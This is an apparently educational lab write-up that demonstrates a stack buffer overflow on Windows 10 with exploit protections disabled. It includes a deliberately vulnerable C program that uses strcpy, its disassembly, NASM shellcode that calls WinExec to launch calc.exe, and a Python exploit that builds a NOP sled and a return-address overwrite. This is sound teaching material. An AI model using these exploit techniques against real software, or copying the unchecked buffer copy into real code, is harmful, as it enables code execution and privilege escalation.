# Buffer overflow through command line argument

This is a demo of buffer overflow through a command line argument. The local buffer of a victim function has enough space to hold the shell code. 

An old version of the password change tool *passwd* has a similar buffer oveflow to victim3.c in this post. The old *passwd* is a program with the root priviledge ([setuid](https://en.wikipedia.org/wiki/Setuid)). When an attacker feeds a malicious string that contains shellcode (i.e., malicious code snippet) into the old *passwd*, the shellcode gets running within the context of the old *passwd* and can change anything of the whole Linux systen since the shellcode can inherit the root priviledge of the old *passwd*.

### Overview

**Experiment setup**:
1. Windows 10 with all Exploit Protection disabled
2. [mingw-w64](http://mingw-w64.org/doku.php) installed
3. [nasm](https://www.nasm.us/) installed
4. [arwin](https://github.com/xinwenfu/arwin) installed
5. [Windows Sysinternals/listdlls](https://docs.microsoft.com/en-us/sysinternals/) installed

**victim3.c**: the victim C code with the vulnerable strcpy, which copies argv[1] into a buffer *char str[64]*. The buffer is large enough to hold our malcious string, which contains shellcode. 
```
// gcc -m32 -o victim3.exe victim3.c
#include <stdio.h>
#include <string.h>

int main(int argc, char **argv) {
	char buf[64];
	
	strcpy(buf, argv[1]);

	return 0;
}
```

Disassembly by IDA
```
.text:004015C0 ; Attributes: bp-based frame fuzzy-sp
.text:004015C0
.text:004015C0 ; int __cdecl main(int argc, const char **argv, const char **envp)
.text:004015C0                 public _main
.text:004015C0 _main           proc near               ; CODE XREF: ___tmainCRTStartup+236â†‘p
.text:004015C0
.text:004015C0 var_40          = byte ptr -40h
.text:004015C0 argc            = dword ptr  8
.text:004015C0 argv            = dword ptr  0Ch
.text:004015C0 envp            = dword ptr  10h
.text:004015C0
.text:004015C0                 push    ebp
.text:004015C1                 mov     ebp, esp
.text:004015C3                 and     esp, 0FFFFFFF0h
.text:004015C6                 sub     esp, 50h
.text:004015C9                 call    ___main
.text:004015CE                 mov     eax, [ebp+argv]
.text:004015D1                 add     eax, 4
.text:004015D4                 mov     eax, [eax]
.text:004015D6                 mov     [esp+4], eax    ; char *
.text:004015DA                 lea     eax, [esp+50h+var_40]
.text:004015DE                 mov     [esp], eax      ; char *
.text:004015E1                 call    _strcpy
.text:004015E6                 mov     eax, 0
.text:004015EB                 leave
.text:004015EC                 retn
.text:004015EC _main           endp
```
```
	+------------------+
	|       **envp	   | 4 bytes
	+------------------+
	|       **argv	   | 4 bytes
	+------------------+
	|       argc	   | 4 bytes
	+------------------+
	|  return address  | 4 bytes
	+------------------+
	|     old ebp	   | 4 bytes
EBP ->	+------------------+
	|		   | 4 bytes
	+------------------+
	|		   | 4 bytes
	+------------------+
	|		   | 4 bytes
	+------------------+
	|		   | 4 bytes
	+------------------+
	|		   | 4 bytes
	+------------------+
	|		   | 4 bytes
	+------------------+
	|		   | 4 bytes
	+------------------+
	|		   | 4 bytes
	+------------------+
	|		   | 4 bytes
	+------------------+
	|		   | 4 bytes
	+------------------+
	|		   | 4 bytes
	+------------------+
	|		   | 4 bytes
	+------------------+
	|		   | 4 bytes
	+------------------+
	|		   | 4 bytes
	+------------------+
	|		   | 4 bytes
	+------------------+
	|		   | 4 bytes
	+------------------+
	|		   | 4 bytes
	+------------------+
	|		   | 4 bytes
	+------------------+		<- buf
	|		   | 4 bytes
	+------------------+
	|		   | 4 bytes
	+------------------+
	|		   | 4 bytes
	+------------------+
      	|		   | 4 bytes
ESP -> 	+------------------+
```

**calc-shell.asm**: the assembly code for shellcode, which pops up a caculator

**exploit.py**: In the python code exploit.py, we save the shell code and other necessary parts into an environment variable, and then open a command shell, which inherits all environment variables including the one we created. In the newly opened command shell, the environment variable is fed into a victim program as a command line argument, which causes the buffer overflow and pops up the calculator.

### Video demo

[![Video demo of attacking victim3.exe](https://img.youtube.com/vi/z1GMBSXHJH0/0.jpg)](https://youtu.be/z1GMBSXHJH0)

### Steps to run the example

#### Step 1. Get WinExec's address
```
c:\Workshop>arwin kernel32.dll WinExec
arwin - win32 address resolution program - by steve hanna - v.01
WinExec is located at 0x74fccd30 in kernel32.dll
```
WinExec is an API in kernel32.dll. We can use the tool arwin to get its address in the computer memory. One limitation of this example is we need to manually get the address of WinExec. Moreover, Windows may load the system dlls such as kernel32.dll at a different address every time Windows restarts. Therefore, we have to get the address of WinExec every time Windows restarts. There are smart ways to automatically get the address of WinExec automatically. But this example is kept simple so that you can see the principle of a buffer overflow attack.

#### Step 2. Create shellcode
Copy and paste the address of WinExec(.), derived from Step 1, into calc-shell.asm shown below at *mov eax, 7657cd30h*.
```
;Assemble: nasm.exe -f win32 calc-shell.asm -o calc-shell.obj
;LINK: GoLink.exe /console /entry _start calc-shell.obj
;IF THE obj FILE IS NOT CREATED WITH THE -f win32 GoLink will COMPLAIN
;Tested and coded on Win10

[BITS 32]	; BITS: Specifying Target Processor Mode 32 bits

[SECTION .text]
global _start   ; declare entry point
_start:

;Put the string "calc.exe\0" onto the stack
xor ecx,ecx     ; ecx=0
push ecx        ; push \0 (null string terminator) onto the stack
push 0x6578652e ; .exe; little endian; 2e(.) is put at lower address
push 0x636c6163 ; calc; little endian

mov ecx,esp     ; esp points to "calc.exe\0"
push 0x1        ; window style
push ecx        ; first argument for WinExec

mov eax, 7657cd30h  ; 7657cd30h is address of WinExec; RVA=0x5dab0 within kernel32.dll; needs to be changed
call eax            ; WinExec("calc.exe\0",1)

;exit clean
;xor ecx, ecx   ; ecx=0
;push ecx       ; argument or ExitProcess
;mov eax, 769b4100h ; RVA=0x258f0; The address of ExitProcess may have the \0 byte! e.g. 0x74f94100
;call eax           ; ExitProcess(0)
```
Load calc-shell.exe into Immunity Debugger and then: Select the code (press mouse's left button and drag) -> Right Click -> Binary -> Binary Copy. Now we have the shellcode copied to the clipboard.

#### Step 3. Create a malicious string that contains the shellcode and more
Paste the shellcode into exploit.py shown below at the right place to create the malicious string. Note that you have to put "\x" in front of each shellcode byte inside the malicious string. exploit.py does three things 
* Creates the malicious string that will be fed into the victim program as the command line argument. The malicous string is composed as follows: *NOP sled Padding  || Shellcode || NOP sled padding || Malicious code address*, where || means concatenaton. The shellcode shall be formated in the appropraite hexdecimal format. The malicious code address points to somewhere in the first NOP sled padding. How did I get The malcious code address and padding length? I just debugged victim3.exe with Immunity Debugger and find out the information. Really it is about where the local buffer is on the stack.
* Creates an environment variable called TEST holding the malicious string.
* Starts a command shell with cmd.exe. 

```
# python exploit.py

import os   # import os module

# Create the malicious string
shell=b"\x90"*26    # padding with nop; no change
# shellcode; change please
shell+=b"\x31\xC9\x51\x68\x2E\x65\x78\x65\x68\x63\x61\x6C\x63\x89\xE1\x6A\x01\x51\xB8\x30\xCD\xFC\x74\xFF\xD0" 
shell+=b"\x90"*25   # padding with nop; no change
shell+=b"\x94\xFE\x61" # address to overwrite return address; no change

os.environ['TEST'] = shell  # create environment variable holding the malicious string

os.system('cmd')    # start a command shell, inheriting TEST environment variable 
```

#### Step 4. Run exploit.py and feed victim3.exe with the malicious string
When the new command shell starts, it inherits the environment variable. We now run victim3.exe with the command line argument as the environment variable %TEST% and the calculator shall pop up.

```
c:\Workshop>exploit.py
Microsoft Windows [Version 10.0.19041.867]
(c) 2020 Microsoft Corporation. All rights reserved.

c:\Workshop>victim3 %TEST%
```
